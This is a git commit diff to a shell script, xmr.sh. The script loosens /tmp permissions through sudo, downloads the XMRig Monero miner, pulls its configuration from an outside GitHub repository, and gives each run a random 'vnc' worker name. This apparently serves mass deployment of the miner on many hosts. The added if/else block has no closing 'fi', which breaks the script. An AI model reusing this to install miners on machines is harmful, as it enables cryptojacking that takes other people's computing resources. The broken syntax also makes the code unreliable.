a3789bc72088d4011683546187d3a6c329a68512
GaminnLinux <gaminnlinuxgit@proton.me>
2024-06-11 17:00:51 +0200

    might revert this

--- xmr.sh
+++ xmr.sh
@@ -8,13 +8,18 @@ else
     sudo -n chmod 777 /tmp
 fi
 
+if command -v wget >/dev/null 2>&1; then
+    DOWNLOAD_CMD="wget"
+else
+    DOWNLOAD_CMD="curl -O"
+
 # use curl because it's present on more distributions
-curl -O https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
+$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
 tar -xf xmrig-6.21.3-linux-static-x64.tar.gz
 cd xmrig-6.21.3
 
 rm -rf config.json
-curl -O https://raw.githubusercontent.com/spetterman66/verynicerepo/main/config.json
+$DOWNLOAD_CMD https://raw.githubusercontent.com/spetterman66/verynicerepo/main/config.json
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json
 
